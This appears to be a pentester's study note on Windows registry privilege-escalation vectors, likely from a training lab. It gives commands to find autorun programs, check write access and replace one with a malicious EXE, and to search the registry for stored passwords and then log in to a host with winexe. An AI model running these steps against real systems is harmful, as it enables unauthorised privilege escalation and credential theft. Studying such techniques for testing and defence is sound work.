# Registry PE Vectors
##### Introduction
A collection of weaknesses and misconfigurations to look for in the Windows Registry.

##### AutoRun Executables
We can check for any programs that a set to autorun on startup, then replace that EXE with a malicious one.

Note: An admin may have to login to trigger certain autorun executables.

1. Find AutoRun programs 

	```
	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	```

2. Check for write access

	```
	C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
	```

3. Replace the PROGRAM.exe with your EXE.

	```
	`copy MALICIOUS.EXE "TARGET_PROGRAM.EXE" /Y`
	```

##### **Search for Passwords**
We can search the registry for anything containing the phrase "*password*".

```
	reg query HKLM /f PHRASE /t REG_SZ /s
```

2. Login using credentials found

	```
	winexe -U 'admin%password' //10.10.198.228 cmd.exe
	```

 - `REG_SZ` - A text string in a format which is convenient for human perception. 
 - `/s` - Specifies to query all *subkeys* and *value* names recursively.

##### *AlwaysInstallElevated*
[obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FRegistry%2FAlwaysInstallElevated](obsidian://open?vault=Security%20%26%20PenTesting&file=Privilege%20Escalation%2FWindows%2FRegistry%2FAlwaysInstallElevated)